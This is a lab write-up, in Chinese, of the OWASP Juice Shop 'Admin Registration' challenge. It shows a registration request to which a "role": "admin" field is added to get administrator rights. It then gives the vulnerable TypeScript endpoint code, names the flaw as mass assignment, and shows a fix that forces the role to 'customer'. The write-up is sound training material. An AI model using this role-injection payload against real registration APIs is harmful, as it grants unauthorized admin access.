- Admin Registration
    - 描述：注册为具有管理员权限的用户。
    - 使用注册功能
        - 请求：
            ```POST /api/Users/ HTTP/1.1```
            ```json
            {
                "email": "fooemail@bar.com",
                "password": "foooo",
                "passwordRepeat": "foooo",
                "securityQuestion": {
                    "id": 7,
                    "question": "Name of your favorite pet?",
                    "createdAt": "2025-12-12T04:53:47.606Z",
                    "updatedAt": "2025-12-12T04:53:47.606Z"
                },
                "securityAnswer": "none"
            }
            ```
        - 响应：
            ```json
            {
                "status": "success",
                "data": {
                    "username": "",
                    "role": "customer",
                    "deluxeToken": "",
                    "lastLoginIp": "0.0.0.0",
                    "profileImage": "/assets/public/images/uploads/default.svg",
                    "isActive": true,
                    "id": 24,
                    "email": "fooemail@bar.com",
                    "updatedAt": "2025-12-12T04:57:17.341Z",
                    "createdAt": "2025-12-12T04:57:17.341Z",
                    "deletedAt": null
                }
            }
            ```
    - 修改请求 JSON，添加名值对 ```"role": "admin"``` 成功注册拥有管理员权限的账户

- 编程挑战：
    ```typescript
    /* Generated API endpoints */
	finale.initialize({ app, sequelize })
	 
	  const autoModels = [
	    { name: 'User', exclude: ['password', 'totpSecret'], model: UserModel },
	    { name: 'Product', exclude: [], model: ProductModel },
	    { name: 'Feedback', exclude: [], model: FeedbackModel },
	    { name: 'BasketItem', exclude: [], model: BasketItemModel },
	    { name: 'Challenge', exclude: [], model: ChallengeModel },
	    { name: 'Complaint', exclude: [], model: ComplaintModel },
	    { name: 'Recycle', exclude: [], model: RecycleModel },
	    { name: 'SecurityQuestion', exclude: [], model: SecurityQuestionModel },
	    { name: 'SecurityAnswer', exclude: [], model: SecurityAnswerModel },
	    { name: 'Address', exclude: [], model: AddressModel },
	    { name: 'PrivacyRequest', exclude: [], model: PrivacyRequestModel },
	    { name: 'Card', exclude: [], model: CardModel },
	    { name: 'Quantity', exclude: [], model: QuantityModel },
	    { name: 'Hint', exclude: [], model: HintModel }
	  ]
	 
	  for (const { name, exclude, model } of autoModels) {
	    const resource = finale.resource({
	      model,
	      endpoints: [`/api/${name}s`, `/api/${name}s/:id`],
	      excludeAttributes: exclude,
	      pagination: false
	    })
	 
	    // create a wallet when a new user is registered using API
	    if (name === 'User') {
	      resource.create.send.before((req: Request, res: Response, context: { instance: { id: any }, continue: any }) => {
	        WalletModel.create({ UserId: context.instance.id }).catch((err: unknown) => {
	          console.log(err)
	        })
	        return context.continue
	      })
	    }
    ```
    - 漏洞在于：创建用户的输入可对角色的```role```属性进行设置，此处使用整个输入对模型进行设置，参数污染漏洞
        ```typescript
	      resource.create.send.before((req: Request, res: Response, context: { instance: { id: any }, continue: any })
        ```
    - 修复：在最后添加角色设置以覆盖 API 注册的角色参数
        ```typescript
        context.instance.role = 'customer'
        return context.continue
        ```
